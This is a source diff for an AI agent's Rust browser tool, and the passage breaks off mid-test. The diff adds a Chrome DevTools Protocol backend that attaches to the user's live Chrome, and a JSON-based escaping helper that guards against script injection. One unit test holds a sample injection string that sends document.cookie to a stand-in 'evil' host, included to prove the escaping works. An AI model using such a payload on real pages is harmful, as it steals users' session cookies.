@@ -3,10 +3,13 @@ use super::{
     utils::http::{SsrfPolicy, validate_public_url},
 };
 use anyhow::{Context, Result, bail};
+use async_trait::async_trait;
+use futures_util::{SinkExt, StreamExt};
 use reqwest::Url;
 use schemars::JsonSchema;
 use scraper::{ElementRef, Html, Selector};
 use serde::Deserialize;
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::{
     net::TcpListener,
     path::PathBuf,
@@ -22,6 +25,7 @@ use tokio::{
     sync::Mutex,
     time::{Instant, sleep},
 };
+use tokio_tungstenite::{connect_async, tungstenite::Message};
 use tracing::{debug, info, warn};
 
 #[cfg(unix)]
@@ -88,12 +92,63 @@ pub struct BrowserArgs {
     /// subsequent calls, so only provide it when you want to (re)start the session in a
     /// specific mode. When omitted, the current session's mode is kept (defaulting to
     /// headless only when no session exists yet).
+    ///
+    /// Ignored when `ARCHON_BROWSER_BACKEND=cdp` (attaching to an existing browser).
     #[serde(default)]
     pub headless: Option<bool>,
 }
 
 fn default_true() -> bool {
     true
+}
+
+/// Backend trait for browser automation.
+///
+/// Implementations can target different protocols (WebDriver, CDP) while
+/// sharing the same action surface exposed to the LLM.
+#[async_trait]
+pub trait BrowserBackend: Send + Sync {
+    /// Human-readable label for status display (e.g. `"managed chromedriver"`, `"CDP"`).
+    fn label(&self) -> String;
+
+    /// Navigate to a URL.
+    async fn goto(&self, url: &str) -> Result<()>;
+
+    /// Wait for a CSS selector to appear in the DOM.
+    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()>;
+
+    /// Read visible text from the element matching `sel`.
+    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String>;
+
+    /// Read visible text from the page `<body>`.
+    async fn read_page_text(&self) -> Result<String>;
+
+    /// Get the full rendered outer HTML of the document.
+    async fn get_outer_html(&self) -> Result<String>;
+
+    /// Click the element matching `sel`.
+    async fn click(&self, sel: &str, timeout: Duration) -> Result<()>;
+
+    /// Type `text` into the element matching `sel`.
+    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()>;
+
+    /// Execute JavaScript in the page context and return the JSON result.
+    async fn evaluate(&self, script: &str) -> Result<serde_json::Value>;
+
+    /// Capture a PNG screenshot (viewport, or element if `sel` is `Some`).
+    async fn screenshot(&self, sel: Option<&str>, timeout: Duration) -> Result<Vec<u8>>;
+
+    /// Get the current page URL.
+    async fn current_url(&self) -> Result<String>;
+
+    /// Get the current page title.
+    async fn title(&self) -> Result<String>;
+
+    /// Check whether the browser session is still alive.
+    async fn is_alive(&self) -> bool;
+
+    /// Close the browser session and free resources.
+    async fn close(&self) -> Result<()>;
 }
 
 struct ManagedDriverProcess {
@@ -147,25 +202,494 @@ impl Drop for ManagedDriverProcess {
     }
 }
 
-struct BrowserSession {
+struct WebDriverBackend {
     driver: WebDriver,
     /// Present only when Archon spawned `chromedriver` itself.
     driver_proc: Option<ManagedDriverProcess>,
 }
 
-impl BrowserSession {
-    async fn teardown(self) {
-        if let Err(e) = self.driver.quit().await {
-            debug!("WebDriver quit error during teardown: {e}");
+#[async_trait]
+impl BrowserBackend for WebDriverBackend {
+    fn label(&self) -> String {
+        if self.driver_proc.is_some() {
+            "managed chromedriver".into()
+        } else {
+            "external WebDriver".into()
         }
-        if let Some(proc) = self.driver_proc {
-            proc.terminate().await;
+    }
+
+    async fn goto(&self, url: &str) -> Result<()> {
+        self.driver
+            .goto(url)
+            .await
+            .with_context(|| format!("Failed to navigate to '{url}'"))?;
+        Ok(())
+    }
+
+    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()> {
+        find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
+        Ok(())
+    }
+
+    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String> {
+        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
+        elem.text().await.context("Failed to read element text")
+    }
+
+    async fn read_page_text(&self) -> Result<String> {
+        let body = self
+            .driver
+            .find(By::Tag("body"))
+            .await
+            .context("Page has no <body>")?;
+        body.text().await.context("Failed to read page text")
+    }
+
+    async fn get_outer_html(&self) -> Result<String> {
+        let ret = self
+            .driver
+            .execute("return document.documentElement.outerHTML", vec![])
+            .await
+            .context("Failed to read rendered HTML")?;
+        ret.json()
+            .as_str()
+            .map(str::to_owned)
+            .ok_or_else(|| anyhow::anyhow!("rendered HTML source was not a string"))
+    }
+
+    async fn click(&self, sel: &str, timeout: Duration) -> Result<()> {
+        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
+        elem.click()
+            .await
+            .with_context(|| format!("Failed to click '{sel}'"))?;
+        Ok(())
+    }
+
+    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()> {
+        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
+        if clear {
+            let _ = elem.clear().await;
+        }
+        elem.send_keys(text)
+            .await
+            .with_context(|| format!("Failed to type into '{sel}'"))?;
+        Ok(())
+    }
+
+    async fn evaluate(&self, script: &str) -> Result<serde_json::Value> {
+        let ret = self
+            .driver
+            .execute(ensure_return(script), vec![])
+            .await
+            .context("JavaScript evaluation failed")?;
+        Ok(ret.json().clone())
+    }
+
+    async fn screenshot(&self, sel: Option<&str>, timeout: Duration) -> Result<Vec<u8>> {
+        match sel {
+            Some(s) => {
+                let elem = find_with_wait(&self.driver, s, timeout.as_secs()).await?;
+                Ok(elem
+                    .screenshot_as_png()
+                    .await
+                    .context("Failed to capture element screenshot")?)
+            }
+            None => Ok(self
+                .driver
+                .screenshot_as_png()
+                .await
+                .context("Failed to capture viewport screenshot")?),
+        }
+    }
+
+    async fn current_url(&self) -> Result<String> {
+        Ok(self.driver.current_url().await?.to_string())
+    }
+
+    async fn title(&self) -> Result<String> {
+        self.driver
+            .title()
+            .await
+            .context("Failed to get page title")
+    }
+
+    async fn is_alive(&self) -> bool {
+        self.driver.status().await.is_ok()
+    }
+
+    async fn close(&self) -> Result<()> {
+        let driver = self.driver.clone();
+        if let Err(e) = driver.quit().await {
+            debug!("WebDriver quit error during close: {e}");
+        }
+        Ok(())
+    }
+}
+
+// ─── CDP Backend ───────────────────────────────────────────────────────────────
+
+/// Which browser backend to use.
+#[derive(Debug, Clone)]
+enum BackendType {
+    WebDriver,
+    Cdp { port: u16 },
+}
+
+impl BackendType {
+    fn from_env() -> Self {
+        match std::env::var("ARCHON_BROWSER_BACKEND").ok().as_deref() {
+            Some("cdp") => Self::Cdp {
+                port: std::env::var("ARCHON_CDP_PORT")
+                    .ok()
+                    .and_then(|p| p.parse().ok())
+                    .unwrap_or(9222),
+            },
+            _ => Self::WebDriver,
         }
     }
 }
 
+/// Attaches to an already-running Chrome via the Chrome DevTools Protocol.
+///
+/// Chrome must be launched with `--remote-debugging-port=<port>`.
+/// This backend does **not** spawn or kill Chrome — it connects to the user's
+/// live browser session over WebSocket.
+/// Encode a string as a safe JavaScript string literal (double-quoted).
+///
+/// Uses JSON string escaping, which is a strict subset of valid JS string
+/// literal syntax. This prevents injection when interpolating user-supplied
+/// CSS selectors into `Runtime.evaluate` expressions.
+fn js_str(s: &str) -> String {
+    serde_json::to_string(s).expect("&str always serializes to JSON")
+}
+
+struct CdpBackend {
+    ws: Mutex<
+        tokio_tungstenite::WebSocketStream<
+            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
+        >,
+    >,
+    next_id: AtomicU64,
+}
+
+impl CdpBackend {
+    /// Discover a page target on `localhost:{port}` and connect via WebSocket.
+    async fn connect(port: u16) -> Result<Self> {
+        let targets_url = format!("http://127.0.0.1:{port}/json");
+        let targets: Vec<serde_json::Value> = reqwest::get(&targets_url)
+            .await
+            .with_context(|| {
+                format!(
+                    "Failed to query CDP targets at {targets_url}. \n\
+                     Ensure Chrome is running with --remote-debugging-port={port}"
+                )
+            })?
+            .json()
+            .await
+            .context("Failed to parse CDP target list")?;
+
+        let target = targets
+            .iter()
+            .find(|t| t.get("type").and_then(|v| v.as_str()) == Some("page"))
+            .context("No 'page' target found in CDP target list. Is a tab open?")?;
+
+        let ws_url = target
+            .get("webSocketDebuggerUrl")
+            .and_then(|v| v.as_str())
+            .context("CDP target has no webSocketDebuggerUrl")?;
+
+        info!("Connecting to CDP WebSocket: {ws_url}");
+        let (ws, _response) = connect_async(ws_url.to_string())
+            .await
+            .with_context(|| format!("WebSocket connection to CDP failed at {ws_url}"))?;
+
+        let backend = Self {
+            ws: Mutex::new(ws),
+            next_id: AtomicU64::new(1),
+        };
+
+        // Enable the CDP domains we need.
+        backend
+            .send_cmd("Page.enable", serde_json::json!({}))
+            .await?;
+        backend
+            .send_cmd("Runtime.enable", serde_json::json!({}))
+            .await?;
+        backend
+            .send_cmd("DOM.enable", serde_json::json!({}))
+            .await?;
+
+        info!("CDP backend connected and domains enabled");
+        Ok(backend)
+    }
+
+    /// Send a CDP command and wait for the matching response by `id`.
+    async fn send_cmd(&self, method: &str, params: serde_json::Value) -> Result<serde_json::Value> {
+        let id = self.next_id.fetch_add(1, Ordering::Relaxed);
+        let msg = serde_json::json!({
+            "id": id,
+            "method": method,
+            "params": params,
+        });
+
+        let mut ws = self.ws.lock().await;
+        ws.send(Message::Text(msg.to_string()))
+            .await
+            .with_context(|| format!("Failed to send CDP command {method}"))?;
+
+        // Read frames until we get the response with our id.
+        loop {
+            let frame = ws
+                .next()
+                .await
+                .ok_or_else(|| anyhow::anyhow!("WebSocket connection closed"))?
+                .with_context(|| format!("WebSocket error during {method}"))?;
+
+            let text = frame
+                .to_text()
+                .with_context(|| format!("CDP response to {method} was not text"))?;
+            let json: serde_json::Value =
+                serde_json::from_str(text).context("Failed to parse CDP response")?;
+
+            if json.get("id").and_then(|v| v.as_u64()) == Some(id) {
+                if let Some(error) = json.get("error") {
+                    bail!("CDP error in {method}: {error}");
+                }
+                return Ok(json
+                    .get("result")
+                    .cloned()
+                    .unwrap_or(serde_json::Value::Null));
+            }
+            // Event or unrelated response — skip
+        }
+    }
+
+    /// Evaluate a JavaScript expression and return the result value.
+    async fn evaluate_raw(&self, expression: &str) -> Result<serde_json::Value> {
+        let result = self
+            .send_cmd(
+                "Runtime.evaluate",
+                serde_json::json!({
+                    "expression": expression,
+                    "returnByValue": true,
+                }),
+            )
+            .await?;
+
+        if let Some(exception) = result.get("exceptionDetails") {
+            let desc = exception
+                .pointer("/exception/description")
+                .and_then(|d| d.as_str())
+                .unwrap_or("unknown JS error");
+            bail!("JS evaluation failed: {desc}");
+        }
+
+        Ok(result
+            .pointer("/result/value")
+            .cloned()
+            .unwrap_or(serde_json::Value::Null))
+    }
+}
+
+#[async_trait]
+impl BrowserBackend for CdpBackend {
+    fn label(&self) -> String {
+        "CDP (attached)".into()
+    }
+
+    async fn goto(&self, url: &str) -> Result<()> {
+        self.send_cmd("Page.navigate", serde_json::json!({"url": url}))
+            .await?;
+        // Poll document.readyState until the page is fully loaded.
+        let deadline = Instant::now() + Duration::from_secs(30);
+        loop {
+            let state = self.evaluate_raw("document.readyState").await?;
+            if state.as_str() == Some("complete") {
+                return Ok(());
+            }
+            if Instant::now() > deadline {
+                bail!("Timed out waiting for page to load: {url}");
+            }
+            sleep(Duration::from_millis(100)).await;
+        }
+    }
+
+    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()> {
+        let escaped = js_str(sel);
+        let expr = format!("document.querySelector({escaped}) !== null");
+        let deadline = Instant::now() + timeout;
+        loop {
+            if self.evaluate_raw(&expr).await?.as_bool() == Some(true) {
+                return Ok(());
+            }
+            if Instant::now() > deadline {
+                bail!("Element '{sel}' not found within {}s", timeout.as_secs());
+            }
+            sleep(Duration::from_millis(200)).await;
+        }
+    }
+
+    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String> {
+        self.wait_for_selector(sel, timeout).await?;
+        let escaped = js_str(sel);
+        let expr = format!("document.querySelector({escaped})?.textContent ?? ''");
+        let val = self.evaluate_raw(&expr).await?;
+        Ok(val.as_str().unwrap_or("").to_string())
+    }
+
+    async fn read_page_text(&self) -> Result<String> {
+        let val = self.evaluate_raw("document.body?.innerText ?? ''").await?;
+        Ok(val.as_str().unwrap_or("").to_string())
+    }
+
+    async fn get_outer_html(&self) -> Result<String> {
+        let val = self
+            .evaluate_raw("document.documentElement.outerHTML")
+            .await?;
+        val.as_str()
+            .map(str::to_owned)
+            .ok_or_else(|| anyhow::anyhow!("document outerHTML was not a string"))
+    }
+
+    async fn click(&self, sel: &str, _timeout: Duration) -> Result<()> {
+        let escaped = js_str(sel);
+        let expr = format!(
+            r#"(() => {{
+                const el = document.querySelector({escaped});
+                if (!el) return null;
+                el.scrollIntoView({{block:'center'}});
+                const r = el.getBoundingClientRect();
+                return {{x: r.x + r.width/2, y: r.y + r.height/2}};
+            }})()"#
+        );
+        let coords = self.evaluate_raw(&expr).await?;
+        let x = coords
+            .get("x")
+            .and_then(|v| v.as_f64())
+            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;
+        let y = coords
+            .get("y")
+            .and_then(|v| v.as_f64())
+            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;
+
+        self.send_cmd(
+            "Input.dispatchMouseEvent",
+            serde_json::json!({
+                "type": "mousePressed", "x": x, "y": y,
+                "button": "left", "clickCount": 1
+            }),
+        )
+        .await?;
+        self.send_cmd(
+            "Input.dispatchMouseEvent",
+            serde_json::json!({
+                "type": "mouseReleased", "x": x, "y": y,
+                "button": "left", "clickCount": 1
+            }),
+        )
+        .await?;
+        Ok(())
+    }
+
+    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()> {
+        self.wait_for_selector(sel, timeout).await?;
+        let escaped = js_str(sel);
+
+        // Focus the element.
+        self.evaluate_raw(&format!("document.querySelector({escaped})?.focus()"))
+            .await?;
+
+        // Clear if requested.
+        if clear {
+            self.evaluate_raw(&format!(
+                r#"(() => {{
+                    const el = document.querySelector({escaped});
+                    if (el) {{ el.value = ''; el.dispatchEvent(new Event('input', {{bubbles:true}})); }}
+                }})()"#
+            ))
+            .await?;
+        }
+
+        // Insert text via CDP Input domain.
+        self.send_cmd("Input.insertText", serde_json::json!({"text": text}))
+            .await?;
+        Ok(())
+    }
+
+    async fn evaluate(&self, script: &str) -> Result<serde_json::Value> {
+        // `Runtime.evaluate` runs in the global scope where `return` is a
+        // SyntaxError. If the script uses top-level `return` (the pattern
+        // required by WebDriver's `execute`), wrap it in an IIFE.
+        let expr = if has_return_statement(script) {
+            format!("(() => {{ {script} }})()")
+        } else {
+            script.to_string()
+        };
+        self.evaluate_raw(&expr).await
+    }
+
+    async fn screenshot(&self, sel: Option<&str>, _timeout: Duration) -> Result<Vec<u8>> {
+        let params = if let Some(s) = sel {
+            let escaped = js_str(s);
+            let box_expr = format!(
+                r#"(() => {{
+                    const el = document.querySelector({escaped});
+                    if (!el) return null;
+                    el.scrollIntoView();
+                    const r = el.getBoundingClientRect();
+                    return {{x:r.x, y:r.y, width:r.width, height:r.height}};
+                }})()"#
+            );
+            let rect = self.evaluate_raw(&box_expr).await?;
+            serde_json::json!({
+                "format": "png",
+                "clip": {
+                    "x": rect.get("x").cloned().unwrap_or(serde_json::json!(0)),
+                    "y": rect.get("y").cloned().unwrap_or(serde_json::json!(0)),
+                    "width": rect.get("width").cloned().unwrap_or(serde_json::json!(1440)),
+                    "height": rect.get("height").cloned().unwrap_or(serde_json::json!(900)),
+                    "scale": 1
+                }
+            })
+        } else {
+            serde_json::json!({"format": "png"})
+        };
+
+        let result = self.send_cmd("Page.captureScreenshot", params).await?;
+        let b64 = result
+            .get("data")
+            .and_then(|d| d.as_str())
+            .context("CDP screenshot response had no 'data' field")?;
+        use base64::Engine;
+        base64::engine::general_purpose::STANDARD
+            .decode(b64)
+            .context("Failed to decode CDP screenshot base64")
+    }
+
+    async fn current_url(&self) -> Result<String> {
+        let val = self.evaluate_raw("location.href").await?;
+        Ok(val.as_str().unwrap_or("").to_string())
+    }
+
+    async fn title(&self) -> Result<String> {
+        let val = self.evaluate_raw("document.title").await?;
+        Ok(val.as_str().unwrap_or("").to_string())
+    }
+
+    async fn is_alive(&self) -> bool {
+        self.evaluate_raw("'alive'").await.is_ok()
+    }
+
+    async fn close(&self) -> Result<()> {
+        // Don't kill Chrome — it's the user's daily driver.
+        // The WebSocket connection closes when the CdpBackend is dropped.
+        debug!("CDP session closed (WebSocket will drop on cleanup)");
+        Ok(())
+    }
+}
+
 pub struct BrowserRegistry {
-    session: Mutex<Option<BrowserSession>>,
+    session: Mutex<Option<Arc<dyn BrowserBackend>>>,
     headless: Mutex<bool>,
 }
 
@@ -217,7 +741,17 @@ impl BrowserRegistry {
         bail!("Timed out waiting for `chromedriver` to become ready at {wd_url}");
     }
 
-    async fn connect_new(headless: bool) -> Result<BrowserSession> {
+    async fn connect_new(headless: bool) -> Result<Arc<dyn BrowserBackend>> {
+        match BackendType::from_env() {
+            BackendType::Cdp { port } => {
+                let backend = CdpBackend::connect(port).await?;
+                Ok(Arc::new(backend))
+            }
+            BackendType::WebDriver => Self::connect_webdriver(headless).await,
+        }
+    }
+
+    async fn connect_webdriver(headless: bool) -> Result<Arc<dyn BrowserBackend>> {
         let (wd_url, mut driver_proc) = match Self::external_webdriver_url() {
             Some(url) => (url, None),
             None => {
@@ -243,10 +777,10 @@ impl BrowserRegistry {
         let mode = if headless { "headless" } else { "visible" };
         info!("Starting {mode} WebDriver session at {wd_url}");
         match WebDriver::new(&wd_url, caps).await {
-            Ok(driver) => Ok(BrowserSession {
+            Ok(driver) => Ok(Arc::new(WebDriverBackend {
                 driver,
                 driver_proc,
-            }),
+            })),
             Err(e) => {
                 if let Some(proc) = driver_proc.take() {
                     proc.terminate().await;
@@ -266,25 +800,25 @@ impl BrowserRegistry {
     ///
     /// This means the mode only has to be specified once; omitting it on later calls
     /// no longer forces a reconnect back to headless.
-    async fn get_or_init(&self, headless: Option<bool>) -> Result<WebDriver> {
+    async fn get_or_init(&self, headless: Option<bool>) -> Result<Arc<dyn BrowserBackend>> {
         let stored_headless = *self.headless.lock().await;
         let desired = headless.unwrap_or(stored_headless);
         let mode_changed = headless.is_some_and(|h| h != stored_headless);
 
         let mut guard = self.session.lock().await;
         if let Some(ref existing) = *guard {
-            if !mode_changed && existing.driver.status().await.is_ok() {
-                return Ok(existing.driver.clone());
+            if !mode_changed && existing.is_alive().await {
+                return Ok(Arc::clone(existing));
             }
             if mode_changed {
                 info!(
                     "Browser mode changed (headless: {stored_headless} -> {desired}); reconnecting..."
                 );
             } else {
-                warn!("Existing WebDriver session is stale; reconnecting...");
+                warn!("Existing browser session is stale; reconnecting...");
             }
             if let Some(stale) = guard.take() {
-                stale.teardown().await;
+                let _ = stale.close().await;
             }
         }
 
@@ -292,10 +826,10 @@ impl BrowserRegistry {
             *self.headless.lock().await = desired;
         }
 
-        let session = Self::connect_new(desired).await?;
-        let driver = session.driver.clone();
-        *guard = Some(session);
-        Ok(driver)
+        let backend = Self::connect_new(desired).await?;
+        let cloned = Arc::clone(&backend);
+        *guard = Some(backend);
+        Ok(cloned)
     }
 
     /// The headless mode of the current (or most recently created) session.
@@ -306,31 +840,22 @@ impl BrowserRegistry {
     pub async fn status(&self) -> String {
         let headless = *self.headless.lock().await;
         let guard = self.session.lock().await;
-        let Some(ref session) = *guard else {
+        let Some(ref backend) = *guard else {
             let mode = if headless { "headless" } else { "visible" };
             return format!("Browser status: inactive (no open session, mode: {mode}).");
         };
-        let url = session
-            .driver
-            .current_url()
-            .await
-            .map(|u| u.to_string())
-            .unwrap_or_default();
-        let title = session.driver.title().await.unwrap_or_default();
-        let managed = if session.driver_proc.is_some() {
-            "managed chromedriver"
-        } else {
-            "external WebDriver"
-        };
+        let url = backend.current_url().await.unwrap_or_default();
+        let title = backend.title().await.unwrap_or_default();
+        let label = backend.label();
         let mode = if headless { "headless" } else { "visible" };
-        format!("Browser status: active ({mode}, {managed})\nURL: {url}\nTitle: {title}")
+        format!("Browser status: active ({mode}, {label})\nURL: {url}\nTitle: {title}")
     }
 
     pub async fn close(&self) -> Result<String> {
         let existing = self.session.lock().await.take();
         match existing {
-            Some(session) => {
-                session.teardown().await;
+            Some(backend) => {
+                let _ = backend.close().await;
                 Ok("Browser session closed.".into())
             }
             None => Ok("No active browser session.".into()),
@@ -339,9 +864,9 @@ impl BrowserRegistry {
 
     /// Called by `CoreEngine::run` on shutdown.
     pub async fn shutdown(&self) {
-        if let Some(session) = self.session.lock().await.take() {
-            info!("Shutting down active WebDriver session...");
-            session.teardown().await;
+        if let Some(backend) = self.session.lock().await.take() {
+            info!("Shutting down active browser session...");
+            let _ = backend.close().await;
         }
     }
 }
@@ -575,7 +1100,7 @@ fn extract_from_html(source: &str, selector: &str) -> Result<serde_json::Value> 
 
 impl AsyncTool for Tool {
     const NAME: &'static str = "browser";
-    const DESCRIPTION: &'static str = "Controls a headless browser via WebDriver (thirtyfour) to render JS pages, interact with DOM elements, evaluate JavaScript, extract structured data via CSS selectors, and capture screenshots.";
+    const DESCRIPTION: &'static str = "Controls a browser to render JS pages, interact with DOM elements, evaluate JavaScript, extract structured data via CSS selectors, and capture screenshots. Uses chromedriver (WebDriver) by default, or attaches to a running Chrome via CDP when ARCHON_BROWSER_BACKEND=cdp.";
     type Args = BrowserArgs;
 
     async fn execute(args: Self::Args, ctx: &ToolContext) -> Result<String> {
@@ -604,11 +1129,8 @@ impl AsyncTool for Tool {
                 );
                 validate_public_url(&parsed, &policy).await?;
 
-                let driver = reg.get_or_init(args.headless).await?;
-                driver
-                    .goto(parsed.as_str())
-                    .await
-                    .with_context(|| format!("Failed to navigate to '{parsed}'"))?;
+                let backend = reg.get_or_init(args.headless).await?;
+                backend.goto(parsed.as_str()).await?;
 
                 if let Some(sel) = args
                     .selector
@@ -616,11 +1138,13 @@ impl AsyncTool for Tool {
                     .map(str::trim)
                     .filter(|s| !s.is_empty())
                 {
-                    find_with_wait(&driver, sel, wait_secs).await?;
+                    backend
+                        .wait_for_selector(sel, Duration::from_secs(wait_secs))
+                        .await?;
                 }
 
-                let final_url = driver.current_url().await?;
-                let title = driver.title().await.unwrap_or_default();
+                let final_url = backend.current_url().await?;
+                let title = backend.title().await.unwrap_or_default();
                 let mode = if reg.headless_mode().await {
                     "[headless]"
                 } else {
@@ -630,28 +1154,21 @@ impl AsyncTool for Tool {
             }
 
             BrowserAction::Read => {
-                let driver = reg.get_or_init(args.headless).await?;
-                let text = if let Some(sel) = args
+                let backend = reg.get_or_init(args.headless).await?;
+                let sel = args
                     .selector
                     .as_deref()
                     .map(str::trim)
-                    .filter(|s| !s.is_empty())
-                {
-                    let elem = find_with_wait(&driver, sel, wait_secs).await?;
-                    elem.text().await.context("Failed to read element text")?
+                    .filter(|s| !s.is_empty());
+                let text = if let Some(s) = sel {
+                    backend
+                        .read_selector_text(s, Duration::from_secs(wait_secs))
+                        .await?
                 } else {
-                    let body = driver
-                        .find(By::Tag("body"))
-                        .await
-                        .context("Page has no <body>")?;
-                    body.text().await.context("Failed to read page text")?
+                    backend.read_page_text().await?
                 };
-                let url = driver
-                    .current_url()
-                    .await
-                    .map(|u| u.to_string())
-                    .unwrap_or_default();
-                let title = driver.title().await.unwrap_or_default();
+                let url = backend.current_url().await.unwrap_or_default();
+                let title = backend.title().await.unwrap_or_default();
                 Ok(format!("URL: {url}\nTitle: {title}\n\n{}", text.trim()))
             }
 
@@ -662,16 +1179,9 @@ impl AsyncTool for Tool {
                     .map(str::trim)
                     .filter(|s| !s.is_empty())
                     .context("'selector' is required for browser:click")?;
-                let driver = reg.get_or_init(args.headless).await?;
-                let elem = find_with_wait(&driver, sel, wait_secs).await?;
-                elem.click()
-                    .await
-                    .with_context(|| format!("Failed to click '{sel}'"))?;
-                let url = driver
-                    .current_url()
-                    .await
-                    .map(|u| u.to_string())
-                    .unwrap_or_default();
+                let backend = reg.get_or_init(args.headless).await?;
+                backend.click(sel, Duration::from_secs(wait_secs)).await?;
+                let url = backend.current_url().await.unwrap_or_default();
                 Ok(format!("Clicked '{sel}'. Current URL: {url}"))
             }
 
@@ -686,14 +1196,10 @@ impl AsyncTool for Tool {
                     .text
                     .as_deref()
                     .context("'text' is required for browser:type")?;
-                let driver = reg.get_or_init(args.headless).await?;
-                let elem = find_with_wait(&driver, sel, wait_secs).await?;
-                if args.clear {
-                    let _ = elem.clear().await;
-                }
-                elem.send_keys(text)
-                    .await
-                    .with_context(|| format!("Failed to type into '{sel}'"))?;
+                let backend = reg.get_or_init(args.headless).await?;
+                backend
+                    .type_text(sel, text, args.clear, Duration::from_secs(wait_secs))
+                    .await?;
                 Ok(format!(
                     "Typed {} chars into '{sel}'.",
                     text.chars().count()
@@ -707,12 +1213,9 @@ impl AsyncTool for Tool {
                     .map(str::trim)
                     .filter(|s| !s.is_empty())
                     .context("'script' is required for browser:eval")?;
-                let driver = reg.get_or_init(args.headless).await?;
-                let ret = driver
-                    .execute(ensure_return(script), vec![])
-                    .await
-                    .context("JavaScript evaluation failed")?;
-                Ok(serde_json::to_string_pretty(ret.json())?)
+                let backend = reg.get_or_init(args.headless).await?;
+                let result = backend.evaluate(script).await?;
+                Ok(serde_json::to_string_pretty(&result)?)
             }
 
             BrowserAction::Extract => {
@@ -722,38 +1225,22 @@ impl AsyncTool for Tool {
                     .map(str::trim)
                     .filter(|s| !s.is_empty())
                     .context("'selector' is required for browser:extract")?;
-                let driver = reg.get_or_init(args.headless).await?;
-                let ret = driver
-                    .execute("return document.documentElement.outerHTML", vec![])
-                    .await
-                    .context("Failed to read rendered HTML for extract")?;
-                let source = ret
-                    .json()
-                    .as_str()
-                    .map(str::to_owned)
-                    .ok_or_else(|| anyhow::anyhow!("rendered HTML source was not a string"))?;
+                let backend = reg.get_or_init(args.headless).await?;
+                let source = backend.get_outer_html().await?;
                 let result = extract_from_html(&source, selector)?;
                 Ok(serde_json::to_string_pretty(&result)?)
             }
 
             BrowserAction::Screenshot => {
-                let driver = reg.get_or_init(args.headless).await?;
-                let png = if let Some(sel) = args
+                let backend = reg.get_or_init(args.headless).await?;
+                let sel = args
                     .selector
                     .as_deref()
                     .map(str::trim)
-                    .filter(|s| !s.is_empty())
-                {
-                    let elem = find_with_wait(&driver, sel, wait_secs).await?;
-                    elem.screenshot_as_png()
-                        .await
-                        .context("Failed to capture element screenshot")?
-                } else {
-                    driver
-                        .screenshot_as_png()
-                        .await
-                        .context("Failed to capture viewport screenshot")?
-                };
+                    .filter(|s| !s.is_empty());
+                let png = backend
+                    .screenshot(sel, Duration::from_secs(wait_secs))
+                    .await?;
 
                 let out_path: PathBuf = match args
                     .path
@@ -984,5 +1471,233 @@ mod tests {
             Some(false),
             "headless should be Some(false) when explicitly set"
         );
+    }
+
+    // ── js_str escaping tests ──────────────────────────────────────────────
+
+    #[test]
+    fn js_str_escapes_double_quotes() {
+        assert_eq!(js_str("say \"hi\""), "\"say \\\"hi\\\"\"");
+    }
+
+    #[test]
+    fn js_str_escapes_backslash() {
+        assert_eq!(js_str(r"C:\path"), "\"C:\\\\path\"");
+    }
+
+    #[test]
+    fn js_str_escapes_newline() {
+        assert_eq!(js_str("a\nb"), "\"a\\nb\"");
+    }
+
+    #[test]
+    fn js_str_round_trips_injection_payload() {
+        let malicious = r#"'); fetch('https://evil/?c='+document.cookie);//"#;
+        let encoded = js_str(malicious);
+        // Must be a single valid JSON string literal.
+        let decoded: &str = serde_json::from_str(&encoded).unwrap();
+        assert_eq!(decoded, malicious);
+        // No unescaped single-quote followed by `)` (the old break-out vector).
+        assert!(encoded.starts_with('"') && encoded.ends_with('"'));
+    }
+
+    #[test]
+    fn js_str_normal_selector() {
+        assert_eq!(js_str("#login-btn"), "\"#login-btn\"");
+    }
+
+    // ── CDP evaluate IIFE-wrapping tests ──────────────────────────────────
+    // Verifies the has_return_statement predicate that decides IIFE wrapping.
+
+    #[test]
+    fn cdp_evaluate_no_wrap_for_bare_expression() {
+        assert!(!has_return_statement("document.title"));
+    }
+
+    #[test]
+    fn cdp_evaluate_wrap_for_top_level_return() {
+        assert!(has_return_statement(
+            "let items = document.querySelectorAll('li'); return items.length;"
+        ));
+    }
+
+    #[test]
+    fn cdp_evaluate_no_wrap_for_callback_return() {
+        assert!(!has_return_statement("[1,2,3].map((x) => x * 2).length"));
+    }
+
+    // ── CDP integration test ──────────────────────────────────────────────
+    // Requires Chrome installed. Run with:
+    //   cargo test cdp_backend_full_lifecycle -- --ignored
+
+    fn find_chrome_binary() -> Option<PathBuf> {
+        if let Ok(p) = std::env::var("CHROME_BIN") {
+            let path = PathBuf::from(p);
+            if path.exists() {
+                return Some(path);
+            }
+        }
+        for name in [
+            "google-chrome",
+            "google-chrome-stable",
+            "chromium",
+            "chromium-browser",
+        ] {
+            for dir in ["/usr/bin", "/usr/local/bin"] {
+                let path = PathBuf::from(dir).join(name);
+                if path.exists() {
+                    return Some(path);
+                }
+            }
+        }
+        None
+    }
+
+    #[tokio::test]
+    #[ignore = "requires Chrome browser installed; run with --ignored"]
+    async fn cdp_backend_full_lifecycle() {
+        let chrome = find_chrome_binary()
+            .expect("Chrome not found. Set CHROME_BIN=/path/to/chrome or install google-chrome.");
+
+        // Pick a random available port.
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        drop(listener);
+
+        // Spawn headless Chrome with CDP enabled.
+        let mut chrome_proc = tokio::process::Command::new(&chrome)
+            .arg("--headless")
+            .arg(format!("--remote-debugging-port={port}"))
+            .arg("--no-sandbox")
+            .arg("--disable-gpu")
+            .arg("--window-size=1280,720")
+            .arg("about:blank")
+            .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()
